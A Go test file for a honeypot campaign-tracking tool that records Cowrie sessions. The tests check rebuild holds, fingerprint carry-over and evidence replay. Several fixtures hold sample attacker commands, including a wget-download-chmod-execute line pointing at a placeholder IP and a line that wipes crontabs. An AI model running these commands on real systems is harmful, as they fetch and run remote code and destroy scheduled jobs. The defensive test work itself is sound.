package store

import (
	"context"
	"database/sql"
	"fmt"
	"reflect"
	"strings"
	"testing"
	"time"

	"github.com/networkshard/shardlure/pkg/models"
)

func TestCarryScriptAssignmentsRules(t *testing.T) {
	a := func(id string, seq int64) scriptAssignment { return scriptAssignment{id, seq} }
	cases := []struct {
		name     string
		pairs    [][2]string
		assigned map[string]scriptAssignment
		set      map[string]scriptAssignment
		del      []string
	}{
		{name: "unchanged", pairs: [][2]string{{"o", "o"}, {"o", "o"}},
			assigned: map[string]scriptAssignment{"o": a("c1", 1)}, set: map[string]scriptAssignment{}},
		{name: "a minority survivor does not keep the row", pairs: [][2]string{{"o", "o"}, {"o", "n"}, {"o", "n"}},
			assigned: map[string]scriptAssignment{"o": a("c1", 1)}, set: map[string]scriptAssignment{"n": a("c1", 1)}, del: []string{"o"}},
		{name: "old keeps the majority", pairs: [][2]string{{"o", "o"}, {"o", "o"}, {"o", "n"}},
			assigned: map[string]scriptAssignment{"o": a("c1", 1)}, set: map[string]scriptAssignment{}},
		{name: "old ties with a larger fingerprint and keeps it", pairs: [][2]string{{"o", "o"}, {"o", "p"}},
			assigned: map[string]scriptAssignment{"o": a("c1", 1)}, set: map[string]scriptAssignment{}},
		{name: "old ties with a smaller fingerprint and loses it", pairs: [][2]string{{"o", "o"}, {"o", "n"}},
			assigned: map[string]scriptAssignment{"o": a("c1", 1)}, set: map[string]scriptAssignment{"n": a("c1", 1)}, del: []string{"o"}},
		{name: "changed", pairs: [][2]string{{"o", "n"}, {"o", "n"}},
			assigned: map[string]scriptAssignment{"o": a("c1", 4)}, set: map[string]scriptAssignment{"n": a("c1", 4)}, del: []string{"o"}},
		{name: "split goes to the majority", pairs: [][2]string{{"o", "n1"}, {"o", "n2"}, {"o", "n2"}},
			assigned: map[string]scriptAssignment{"o": a("c1", 4)}, set: map[string]scriptAssignment{"n2": a("c1", 4)}, del: []string{"o"}},
		{name: "split tie goes to the smallest fingerprint", pairs: [][2]string{{"o", "nb"}, {"o", "na"}},
			assigned: map[string]scriptAssignment{"o": a("c1", 4)}, set: map[string]scriptAssignment{"na": a("c1", 4)}, del: []string{"o"}},
		{name: "collapse keeps the lowest seq", pairs: [][2]string{{"o1", "n"}, {"o2", "n"}, {"o3", "n"}},
			assigned: map[string]scriptAssignment{"o1": a("c1", 9), "o2": a("c2", 3), "o3": a("c3", 7)},
			set:      map[string]scriptAssignment{"n": a("c2", 3)}, del: []string{"o1", "o2", "o3"}},
		{name: "collapse seq tie keeps the lowest key", pairs: [][2]string{{"ob", "n"}, {"oa", "n"}},
			assigned: map[string]scriptAssignment{"oa": a("c1", 3), "ob": a("c2", 3)},
			set:      map[string]scriptAssignment{"n": a("c1", 3)}, del: []string{"oa", "ob"}},
		{name: "existing row with a lower seq wins", pairs: [][2]string{{"o", "n"}},
			assigned: map[string]scriptAssignment{"o": a("c1", 5), "n": a("c2", 2)},
			set:      map[string]scriptAssignment{}, del: []string{"o"}},
		{name: "existing row with a higher seq loses", pairs: [][2]string{{"o", "n"}},
			assigned: map[string]scriptAssignment{"o": a("c1", 5), "n": a("c2", 8)},
			set:      map[string]scriptAssignment{"n": a("c1", 5)}, del: []string{"o"}},
		{name: "rotation: a moved-away row does not compete", pairs: [][2]string{{"o1", "o2"}, {"o2", "u"}},
			assigned: map[string]scriptAssignment{"o1": a("c1", 9), "o2": a("c2", 1)},
			set:      map[string]scriptAssignment{"o2": a("c1", 9), "u": a("c2", 1)}, del: []string{"o1"}},
		{name: "no row, or nothing settled: skipped", pairs: [][2]string{{"x", "n"}},
			assigned: map[string]scriptAssignment{"o": a("c1", 1)}, set: map[string]scriptAssignment{}},
	}
	for _, tc := range cases {
		set, del := carryScriptAssignments(tc.pairs, tc.assigned)
		if !reflect.DeepEqual(set, tc.set) || !reflect.DeepEqual(del, tc.del) {
			t.Errorf("%s: set=%v del=%v, want set=%v del=%v", tc.name, set, del, tc.set, tc.del)
		}
	}
}

// The hold waits for the recorder and for every session with a line at or
// below the high-water mark to settle, and ends at the deadline regardless.
func TestScriptRebuildHoldGates(t *testing.T) {
	s := newTestStore(t, "hold.db")
	ctx := context.Background()
	now := time.Now().UTC()
	cowrieEvent(t, s, "s1", "cowrie:a", "command", "id", "", "", now.Add(-time.Hour))
	if _, err := s.RecordCampaignEvidence(ctx, 5000); err != nil {
		t.Fatal(err)
	}
	if reset, err := s.ResetScriptsForVersion(ctx, 99); err != nil || !reset {
		t.Fatalf("reset=%v err=%v", reset, err)
	}
	if held, err := s.ScriptRebuildHold(ctx, time.Now()); err != nil || !held {
		t.Fatalf("recorder behind: held=%v err=%v", held, err)
	}
	if _, err := s.RecordCampaignEvidence(ctx, 5000); err != nil {
		t.Fatal(err)
	}
	if held, err := s.ScriptRebuildHold(ctx, time.Now()); err != nil || !held {
		t.Fatalf("session unsettled: held=%v err=%v", held, err)
	}
	// The deadline ends it even with the session still unsettled.
	if held, err := s.ScriptRebuildHold(ctx, time.Now().Add(scriptHoldDuration+time.Minute)); err != nil || held {
		t.Fatalf("past the deadline: held=%v err=%v", held, err)
	}
	if held, err := s.ScriptRebuildHold(ctx, time.Now()); err != nil || held {
		t.Fatalf("released hold came back: held=%v err=%v", held, err)
	}
	// A second bump: settling ends it before the deadline.
	if _, err := s.ResetScriptsForVersion(ctx, 100); err != nil {
		t.Fatal(err)
	}
	if _, err := s.RecordCampaignEvidence(ctx, 5000); err != nil {
		t.Fatal(err)
	}
	if n, err := s.SettleSessionScripts(ctx, time.Now().Add(time.Minute), 10); err != nil || n != 1 {
		t.Fatalf("settle %d %v", n, err)
	}
	if held, err := s.ScriptRebuildHold(ctx, time.Now()); err != nil || held {
		t.Fatalf("all settled: held=%v err=%v", held, err)
	}
}

// Downtime after a reset must not release the hold: the deadline counts from
// the first check that sees the recorder past the high-water mark, and is
// persisted so a restart keeps it. Before, it counted from the reset, and a
// restart 2 hours later released at once with nothing re-recorded, deleting
// the carry snapshot.
func TestScriptRebuildHoldSurvivesDowntime(t *testing.T) {
	s := newTestStore(t, "hold-downtime.db")
	ctx := context.Background()
	cowrieEvent(t, s, "s1", "cowrie:a", "command", "id", "", "", time.Now().UTC().Add(-time.Hour))
	if _, err := s.RecordCampaignEvidence(ctx, 5000); err != nil {
		t.Fatal(err)
	}
	if _, err := s.db.Exec(`INSERT INTO session_scripts(session_id,actor_id,first_seen,last_seen,updated_at,fingerprint) VALUES('old','cowrie:a','x','x','x','fp')`); err != nil {
		t.Fatal(err)
	}
	if reset, err := s.ResetScriptsForVersion(ctx, 99); err != nil || !reset {
		t.Fatalf("reset=%v err=%v", reset, err)
	}
	restart := time.Now().Add(2 * time.Hour)
	if held, err := s.ScriptRebuildHold(ctx, restart); err != nil || !held {
		t.Fatalf("restart after downtime, recorder behind: held=%v err=%v", held, err)
	}
	if _, err := s.RecordCampaignEvidence(ctx, 5000); err != nil {
		t.Fatal(err)
	}
	if held, err := s.ScriptRebuildHold(ctx, restart); err != nil || !held {
		t.Fatalf("recorder caught up, session unsettled: held=%v err=%v", held, err)
	}
	var carried int
	s.db.QueryRow(`SELECT COUNT(*) FROM script_version_carry`).Scan(&carried)
	if carried != 1 {
		t.Fatalf("carry snapshot lost (%d rows)", carried)
	}
	// The clock started at the first observation (restart), not the reset.
	if held, err := s.ScriptRebuildHold(ctx, restart.Add(scriptHoldDuration-time.Minute)); err != nil || !held {
		t.Fatalf("inside the deadline: held=%v err=%v", held, err)
	}
	if held, err := s.ScriptRebuildHold(ctx, restart.Add(scriptHoldDuration+time.Minute)); err != nil || held {
		t.Fatalf("past the deadline: held=%v err=%v", held, err)
	}
}

// The release applies the majority rule through SQL: two of O's three
// sessions settled to N, one still to O, so O's row moves to N.
func TestScriptRebuildReleaseMovesRowToMajority(t *testing.T) {
	s := newTestStore(t, "hold-majority.db")
	ctx := context.Background()
	for _, q := range []string{
		`INSERT INTO script_version_carry(session_id,fingerprint) VALUES('s1','O'),('s2','O'),('s3','O')`,
		`INSERT INTO session_scripts(session_id,actor_id,first_seen,last_seen,updated_at,settled_at,fingerprint) VALUES
  ('s1','cowrie:a','x','x','x','x','O'),('s2','cowrie:b','x','x','x','x','N'),('s3','cowrie:c','x','x','x','x','N')`,
		`INSERT INTO campaign_ids(kind,value,campaign_id,seq) VALUES('script','O','c-keep',3),('ssh_key','k','c-other',1)`,
		`INSERT INTO ingest_state(source,path,inode,offset,head_sig,updated_at) VALUES('script_version','hold_hwm',0,0,'','x')`,
	} {
		if _, err := s.db.Exec(q); err != nil {
			t.Fatal(err)
		}
	}
	if held, err := s.ScriptRebuildHold(ctx, time.Now()); err != nil || held {
		t.Fatalf("held=%v err=%v", held, err)
	}
	rows, err := s.db.Query(`SELECT kind, value, campaign_id, seq FROM campaign_ids ORDER BY kind, value`)
	if err != nil {
		t.Fatal(err)
	}
	defer rows.Close()
	var got []string
	for rows.Next() {
		var k, v, id string
		var seq int
		if err := rows.Scan(&k, &v, &id, &seq); err != nil {
			t.Fatal(err)
		}
		got = append(got, fmt.Sprintf("%s:%s=%s/%d", k, v, id, seq))
	}
	if err := rows.Err(); err != nil {
		t.Fatal(err)
	}
	if want := "script:N=c-keep/3 ssh_key:k=c-other/1"; strings.Join(got, " ") != want {
		t.Fatalf("campaign_ids %v, want %s", got, want)
	}
}

// twoSessionEvents is the --replace fixture: one distinctive script run in
// two sessions by two actors, so a script-only campaign forms. Calling it
// again yields the same events, as re-ingesting the same file does.
func twoSessionEvents(at time.Time) []*models.Event {
	const cmd = "cd /tmp; wget http://198.51.100.9/a.sh; chmod +x a.sh; ./a.sh; rm -f a.sh"
	var out []*models.Event
	for i, a := range []string{"cowrie:a", "cowrie:b"} {
		out = append(out, &models.Event{TS: at, Source: models.SourceCowrie, Kind: models.KindCommand, SrcIP: "198.51.100.1",
			SessionID: fmt.Sprintf("s%d", i), ActorID: a, Command: cmd})
	}
	return out
}

// settledScriptCampaign records twoSessionEvents and stores what an older
// normaliser left behind: both sessions settled to OLD, and a renamed
// script-only campaign c-keep owning OLD in campaign_ids.
func settledScriptCampaign(t *testing.T, s *Store, at time.Time) {
	t.Helper()
	for _, e := range twoSessionEvents(at) {
		if err := s.InsertEvent(e); err != nil {
			t.Fatal(err)
		}
	}
	if _, err := s.RecordCampaignEvidence(context.Background(), 5000); err != nil {
		t.Fatal(err)
	}
	ts := formatFixedUTC(at)
	for _, q := range []string{
		`UPDATE session_scripts SET fingerprint='OLD', settled_at='` + ts + `'`,
		`INSERT INTO campaign_ids(kind,value,campaign_id,seq) VALUES('script','OLD','c-keep',1)`,
		`INSERT INTO campaigns(id,name,updated_at) VALUES('c-keep','Keep','` + ts + `')`,
		`INSERT INTO campaign_edits(campaign_id,action,arg,created_at) VALUES('c-keep','rename','Keep','` + ts + `')`,
	} {
		if _, err := s.db.Exec(q); err != nil {
			t.Fatal(err)
		}
	}
}

// A Cowrie --replace with no rebuild hold active must arm one (pipeline
// audit I1). The replace deletes every session_scripts row, and a
// re-recorded session cannot settle for settleIdle (10 minutes of
// ingest-time idleness), so for that long there is no settled script
// anywhere; nothing else suppressed regroups, and the worker regroups as soon
// as the backlog drains. Group keeps an assignment only for a value with an
// occurrence, so that regroup replaced campaign_ids without the script rows
// and, when the sessions settled, minted a fresh ID: the renamed campaign was
// left a named, empty shell (prod carries a script-only renamed campaign, so
// one documented CLI command lost it). ssh_key and payload evidence were
// never affected: the recorder re-creates them in the first windows. Here the
// old fingerprint differs from the one the sessions settle to, so the row
// survives only if the replace also snapshotted the carry.
func TestReplaceWithoutHoldArmsRebuildHold(t *testing.T) {
	s := newTestStore(t, "replace-no-hold.db")
	ctx := context.Background()
	at := time.Now().UTC().Add(-time.Hour)
	settledScriptCampaign(t, s, at)
	if held, err := s.ScriptRebuildHold(ctx, time.Now()); err != nil || held {
		t.Fatalf("precondition: a hold is active (held=%v err=%v)", held, err)
	}
	// `shardlure ingest cowrie <the same file> --replace`.
	if err := s.ReplaceSourceEventsAndActorsAgg(models.SourceCowrie, twoSessionEvents(at), nil); err != nil {
		t.Fatal(err)
	}
	// The daemon's next tick drains the re-inserted rows, then asks the hold.
	for i := 0; i < 5; i++ {
		if _, err := s.RecordCampaignEvidence(ctx, 5000); err != nil {
			t.Fatal(err)
		}
	}
	if held, err := s.ScriptRebuildHold(ctx, time.Now()); err != nil || !held {
		t.Fatalf("after a --replace with no hold active: held=%v err=%v; the re-recorded sessions cannot have settled yet, so the drain's regroup drops c-keep's script row", held, err)
	}
	var carried int
	if err := s.db.QueryRow(`SELECT COUNT(*) FROM script_version_carry`).Scan(&carried); err != nil || carried != 2 {
		t.Fatalf("carry snapshot after the replace = %d rows, %v; want both settled sessions", carried, err)
	}
	// Ten minutes pass: the sessions settle to the current fingerprint.
	if n, err := s.SettleSessionScripts(ctx, time.Now().Add(time.Minute), 10); err != nil || n != 2 {
		t.Fatalf("settle %d %v", n, err)
	}
	if held, err := s.ScriptRebuildHold(ctx, time.Now()); err != nil || held {
		t.Fatalf("settled: held=%v err=%v", held, err)
	}
	var fp, value, id, name string
	s.db.QueryRow(`SELECT fingerprint FROM session_scripts WHERE session_id='s0'`).Scan(&fp)
	if err := s.db.QueryRow(`SELECT value, campaign_id FROM campaign_ids WHERE kind='script'`).Scan(&value, &id); err != nil || value != fp || id != "c-keep" {
		t.Fatalf("script row %s -> %s (%v), want %s -> c-keep", value, id, err, fp)
	}
	if err := s.db.QueryRow(`SELECT name FROM campaigns WHERE id='c-keep'`).Scan(&name); err != nil || name != "Keep" {
		t.Fatalf("renamed campaign %q %v", name, err)
	}
	var holds int
	s.db.QueryRow(`SELECT COUNT(*) FROM ingest_state WHERE source='script_version' AND path<>'normaliser'`).Scan(&holds)
	s.db.QueryRow(`SELECT COUNT(*) FROM script_version_carry`).Scan(&carried)
	if holds != 0 || carried != 0 {
		t.Fatalf("after the release: %d hold rows, %d carry rows", holds, carried)
	}
}

// A Cowrie --replace during a rebuild hold must not release it. The replace
// parks the recorder at the pre-delete maximum id, which is past the hold's
// high-water mark, so the next check found nothing pending, released, and
// dropped the carry map: every script row in campaign_ids was orphaned. The
// re-ingested events keep their session IDs, so the carry still applies once
// they are re-recorded and settled. Here the old fingerprint differs from
// the one the sessions settle to (as after a normaliser change), so the row
// survives only through the carry.
func TestReplaceDuringRebuildHoldKeepsCarry(t *testing.T) {
	s := newTestStore(t, "hold-replace.db")
	ctx := context.Background()
	at := time.Now().UTC().Add(-time.Hour)
	events := func() []*models.Event { return twoSessionEvents(at) }
	settledScriptCampaign(t, s, at)
	if reset, err := s.ResetScriptsForVersion(ctx, 99); err != nil || !reset {
		t.Fatalf("reset=%v err=%v", reset, err)
	}
	// Catch the recorder up so the hold anchors its deadline before the
	// replace: the replace must then drop that anchor.
	if _, err := s.RecordCampaignEvidence(ctx, 5000); err != nil {
		t.Fatal(err)
	}
	if held, err := s.ScriptRebuildHold(ctx, time.Now()); err != nil || !held {
		t.Fatalf("caught up, unsettled: held=%v err=%v", held, err)
	}
	holdRow := func(path string) (int64, bool) {
		t.Helper()
		var v int64
		err := s.db.QueryRow(`SELECT offset FROM ingest_state WHERE source='script_version' AND path=?`, path).Scan(&v)
		if err != nil && err != sql.ErrNoRows {
			t.Fatal(err)
		}
		return v, err == nil
	}
	if _, ok := holdRow("hold_deadline"); !ok {
		t.Fatal("precondition: no deadline anchor before the replace")
	}
	// --replace with the same sessions while the hold is active.
	if err := s.ReplaceSourceEventsAndActorsAgg(models.SourceCowrie, events(), nil); err != nil {
		t.Fatal(err)
	}
	if _, ok := holdRow("hold_deadline"); ok {
		t.Fatal("the replace kept the deadline anchor")
	}
	if hwm, ok := holdRow("hold_hwm"); !ok || hwm != scriptHoldRemeasure {
		t.Fatalf("hold_hwm = %d (present %v), want the re-measure sentinel %d", hwm, ok, scriptHoldRemeasure)
	}
	if held, err := s.ScriptRebuildHold(ctx, time.Now()); err != nil || !held {
		t.Fatalf("after --replace, nothing re-recorded: held=%v err=%v", held, err)
	}
	for i := 0; i < 5; i++ {
		if _, err := s.RecordCampaignEvidence(ctx, 5000); err != nil {
			t.Fatal(err)
		}
	}
	if held, err := s.ScriptRebuildHold(ctx, time.Now()); err != nil || !held {
		t.Fatalf("re-recorded but unsettled: held=%v err=%v", held, err)
	}
	if n, err := s.SettleSessionScripts(ctx, time.Now().Add(time.Minute), 10); err != nil || n != 2 {
		t.Fatalf("settle %d %v", n, err)
	}
	if held, err := s.ScriptRebuildHold(ctx, time.Now()); err != nil || held {
		t.Fatalf("settled: held=%v err=%v", held, err)
	}
	var fp, id, name string
	s.db.QueryRow(`SELECT fingerprint FROM session_scripts WHERE session_id='s0'`).Scan(&fp)
	if err := s.db.QueryRow(`SELECT value, campaign_id FROM campaign_ids WHERE kind='script'`).Scan(&id, &name); err != nil || id != fp || name != "c-keep" {
		t.Fatalf("script row %s -> %s (%v), want %s -> c-keep", id, name, err, fp)
	}
	if err := s.db.QueryRow(`SELECT name FROM campaigns WHERE id='c-keep'`).Scan(&name); err != nil || name != "Keep" {
		t.Fatalf("renamed campaign %q %v", name, err)
	}
	// A --replace outside a hold arms one of its own (pipeline audit I1,
	// TestReplaceWithoutHoldArmsRebuildHold): the re-measure sentinel, no
	// deadline anchor, and a carry snapshot of the two settled sessions.
	if err := s.ReplaceSourceEventsAndActorsAgg(models.SourceCowrie, events(), nil); err != nil {
		t.Fatal(err)
	}
	if hwm, ok := holdRow("hold_hwm"); !ok || hwm != scriptHoldRemeasure {
		t.Fatalf("after a replace outside a hold: hold_hwm = %d (present %v), want the sentinel %d", hwm, ok, scriptHoldRemeasure)
	}
	if _, ok := holdRow("hold_deadline"); ok {
		t.Fatal("a replace outside a hold wrote a deadline anchor")
	}
	var carried int
	if err := s.db.QueryRow(`SELECT COUNT(*) FROM script_version_carry`).Scan(&carried); err != nil || carried != 2 {
		t.Fatalf("carry after a replace outside a hold = %d rows, %v; want the two settled sessions", carried, err)
	}
}

// The hold's recording phase compares the cursor with the high-water mark
// taken at reset, and the recorder stops at MAX(events.id). If the events at
// the top of the id range are deleted after the reset (a journal --replace
// with an empty file, or a purge of old-timestamped rows ingested last), the
// cursor could never reach the mark until a new event arrived: in live that is
// seconds, in a standalone `web` on a static database never, and every regroup
// stayed suspended (store-pipeline audit M2). The mark is now effectively
// min(hwm, MAX(events.id)): nothing above what exists is left to re-record.
func TestScriptRebuildHoldEndsWhenTopEventsDeleted(t *testing.T) {
	s := newTestStore(t, "hold-top.db")
	ctx := context.Background()
	now := time.Now().UTC()
	cowrieEvent(t, s, "s1", "cowrie:a", "command", "id", "", "", now.Add(-time.Hour))
	cowrieEvent(t, s, "s2", "cowrie:b", "command", "uname -a", "", "", now.Add(-time.Hour))
	if _, err := s.RecordCampaignEvidence(ctx, 5000); err != nil {
		t.Fatal(err)
	}
	if reset, err := s.ResetScriptsForVersion(ctx, 99); err != nil || !reset {
		t.Fatalf("reset=%v err=%v", reset, err)
	}
	// The top event disappears after the reset measured hwm=2.
	if _, err := s.db.Exec(`DELETE FROM events WHERE id=2`); err != nil {
		t.Fatal(err)
	}
	if _, err := s.RecordCampaignEvidence(ctx, 5000); err != nil {
		t.Fatal(err)
	}
	status, err := s.ScriptRebuildHoldStatus(ctx)
	if err != nil || status.Phase != "settling" || status.Target != 1 || status.Recorded != 1 {
		t.Fatalf("status = %+v, %v; want settling at 1/1: nothing above event 1 exists to re-record", status, err)
	}
	if held, err := s.ScriptRebuildHold(ctx, time.Now()); err != nil || !held {
		t.Fatalf("s1 unsettled: held=%v err=%v", held, err)
	}
	// The deadline clock started, so the hold now ends on its own without any
	// new ingest, as it must for a standalone web on a static database.
	if held, err := s.ScriptRebuildHold(ctx, time.Now().Add(scriptHoldDuration+time.Minute)); err != nil || held {
		t.Fatalf("past the deadline with the top events deleted: held=%v err=%v", held, err)
	}
	// And settling alone ends it too, on a fresh reset of the same shape.
	if _, err := s.ResetScriptsForVersion(ctx, 100); err != nil {
		t.Fatal(err)
	}
	cowrieEvent(t, s, "s3", "cowrie:c", "command", "w", "", "", now.Add(-time.Hour))
	if _, err := s.db.Exec(`DELETE FROM events WHERE id=(SELECT MAX(id) FROM events)`); err != nil {
		t.Fatal(err)
	}
	if _, err := s.RecordCampaignEvidence(ctx, 5000); err != nil {
		t.Fatal(err)
	}
	if n, err := s.SettleSessionScripts(ctx, time.Now().Add(time.Hour), 10); err != nil || n != 1 {
		t.Fatalf("settle %d %v", n, err)
	}
	if held, err := s.ScriptRebuildHold(ctx, time.Now()); err != nil || held {
		t.Fatalf("all settled, top events gone: held=%v err=%v", held, err)
	}
}

// An interrupted reset must carry assignments from the fingerprint the
// session had before the *first* attempt (store-pipeline audit M6). The crash
// here landed after step 1 (the carry snapshot) and partway through step 2:
// s1's rows are already deleted, s2's still exist with a fingerprint that is
// not its pre-reset one (as if a re-settle had raced in), and the version was
// never written. The rerun must keep both carry rows as they are (INSERT OR
// IGNORE), and the release must move each campaign ID to the session's new
// fingerprint.
func TestInterruptedResetStillCarries(t *testing.T) {
	s := newTestStore(t, "reset-crash.db")
	ctx := context.Background()
	old := time.Now().UTC().Add(-time.Hour)
	cowrieEvent(t, s, "s1", "cowrie:a", "command", injector, "", "", old)
	cowrieEvent(t, s, "s2", "cowrie:b", "command", "uname -a; cat /proc/cpuinfo; nproc; free -m; crontab -r", "", "", old)
	if _, err := s.RecordCampaignEvidence(ctx, 5000); err != nil {
		t.Fatal(err)
	}
	if n, err := s.SettleSessionScripts(ctx, time.Now().Add(time.Minute), 10); err != nil || n != 2 {
		t.Fatalf("settle %d %v", n, err)
	}
	f0a, f0b := strings.Repeat("1", 64), strings.Repeat("2", 64) // the pre-reset (old encoding) fingerprints
	for _, q := range []string{
		`INSERT INTO script_version_carry(session_id,fingerprint) VALUES('s1','` + f0a + `'),('s2','` + f0b + `')`,
		`INSERT INTO campaign_ids(kind,value,campaign_id,seq) VALUES('script','` + f0a + `','c-a',1),('script','` + f0b + `','c-b',2)`,
		`DELETE FROM session_scripts WHERE session_id='s1'`,
		`DELETE FROM session_script_lines WHERE session_id='s1'`,
	} {
		if _, err := s.db.Exec(q); err != nil {
			t.Fatalf("%v\n%s", err, q)
		}
	}
	if reset, err := s.ResetScriptsForVersion(ctx, 99); err != nil || !reset {
		t.Fatalf("rerun reset=%v err=%v", reset, err)
	}
	carry := map[string]string{}
	rows, err := s.db.Query(`SELECT session_id, fingerprint FROM script_version_carry`)
	if err != nil {
		t.Fatal(err)
	}
	for rows.Next() {
		var sid, fp string
		if err := rows.Scan(&sid, &fp); err != nil {
			t.Fatal(err)
		}
		carry[sid] = fp
	}
	if err := rows.Err(); err != nil {
		t.Fatal(err)
	}
	rows.Close()
	if carry["s1"] != f0a || carry["s2"] != f0b || len(carry) != 2 {
		t.Fatalf("carry after the rerun = %v; want the first attempt's snapshot kept", carry)
	}
	if held, err := s.ScriptRebuildHold(ctx, time.Now()); err != nil || !held {
		t.Fatalf("rerun did not hold: %v %v", held, err)
	}
	if _, err := s.RecordCampaignEvidence(ctx, 5000); err != nil {
		t.Fatal(err)
	}
	if n, err := s.SettleSessionScripts(ctx, time.Now().Add(time.Hour), 10); err != nil || n != 2 {
		t.Fatalf("re-settle %d %v", n, err)
	}
	if held, err := s.ScriptRebuildHold(ctx, time.Now()); err != nil || held {
		t.Fatalf("release: held=%v err=%v", held, err)
	}
	for sid, want := range map[string]string{"s1": "c-a", "s2": "c-b"} {
		var got string
		if err := s.db.QueryRow(`SELECT c.campaign_id FROM campaign_ids c JOIN session_scripts ss ON ss.fingerprint=c.value WHERE c.kind='script' AND ss.session_id=?`, sid).Scan(&got); err != nil || got != want {
			t.Fatalf("%s: campaign %q, %v; want %s carried to its new fingerprint", sid, got, err, want)
		}
	}
	var stale int
	if err := s.db.QueryRow(`SELECT COUNT(*) FROM campaign_ids WHERE value IN (?,?)`, f0a, f0b).Scan(&stale); err != nil || stale != 0 {
		t.Fatalf("old fingerprint rows left: %d, %v", stale, err)
	}
}

// Older builds' ExtractKeys accepted some malformed key blobs (script Version
// 4), so ssh_key evidence they wrote can hold values the current extractor
// never produces. The version reset deletes key evidence and the replay from
// cursor 0 re-creates only the valid rows; payload evidence and campaign
// identity are untouched, and the hold keeps regroups off until the replay has
// passed the mark.
func TestVersionResetRebuildsKeyEvidence(t *testing.T) {
	s := newTestStore(t, "reset-keys.db")
	ctx := context.Background()
	old := time.Now().UTC().Add(-time.Hour)
	sha := strings.Repeat("ab", 32)
	cowrieEvent(t, s, "s1", "cowrie:a", "command", injector, "", "", old)
	cowrieEvent(t, s, "s2", "cowrie:b", "file_download", "", sha, "x.sh", old)
	if _, err := s.RecordCampaignEvidence(ctx, 5000); err != nil {
		t.Fatal(err)
	}
	var validKey string
	if err := s.db.QueryRow(`SELECT value FROM campaign_evidence WHERE kind='ssh_key' AND session_id='s1'`).Scan(&validKey); err != nil {
		t.Fatalf("fixture: no valid key evidence: %v", err)
	}
	for _, q := range []string{
		// What an older extractor recorded from a malformed blob.
		`INSERT INTO campaign_evidence(kind,value,session_id,actor_id,first_seen,last_seen) VALUES('ssh_key','SHA256:stale-malformed','s1','cowrie:a','` + formatFixedUTC(old) + `','` + formatFixedUTC(old) + `')`,
		`INSERT INTO campaign_ids(kind,value,campaign_id,seq) VALUES('ssh_key','` + validKey + `','c-key',1)`,
		`INSERT INTO campaigns(id,name,updated_at) VALUES('c-key','Outlaw/Dota','x')`,
	} {
		if _, err := s.db.Exec(q); err != nil {
			t.Fatalf("%v\n%s", err, q)
		}
	}
	evidence := func() string {
		t.Helper()
		var out string
		if err := s.db.QueryRow(`SELECT COALESCE(group_concat(kind||'='||value||'@'||session_id, ' '),'') FROM (SELECT kind, value, session_id FROM campaign_evidence ORDER BY kind, value)`).Scan(&out); err != nil {
			t.Fatal(err)
		}
		return out
	}
	if reset, err := s.ResetScriptsForVersion(ctx, 99); err != nil || !reset {
		t.Fatalf("reset=%v err=%v", reset, err)
	}
	if got, want := evidence(), "payload="+sha+"@s2"; got != want {
		t.Fatalf("after reset evidence = %q, want only the payload row", got)
	}
	if held, err := s.ScriptRebuildHold(ctx, time.Now()); err != nil || !held {
		t.Fatalf("key evidence deleted but no hold: held=%v err=%v", held, err)
	}
	if status, err := s.ScriptRebuildHoldStatus(ctx); err != nil || status.Phase != "recording" {
		t.Fatalf("status %+v %v: regroups must wait for the replay", status, err)
	}
	if _, err := s.RecordCampaignEvidence(ctx, 5000); err != nil {
		t.Fatal(err)
	}
	if got, want := evidence(), "payload="+sha+"@s2 ssh_key="+validKey+"@s1"; got != want {
		t.Fatalf("after replay evidence = %q, want %q (stale key gone, valid key back)", got, want)
	}
	var cid, name string
	if err := s.db.QueryRow(`SELECT c.campaign_id, k.name FROM campaign_ids c JOIN campaigns k ON k.id=c.campaign_id WHERE c.kind='ssh_key' AND c.value=?`, validKey).Scan(&cid, &name); err != nil || cid != "c-key" || name != "Outlaw/Dota" {
		t.Fatalf("campaign identity = %q %q, %v", cid, name, err)
	}
}
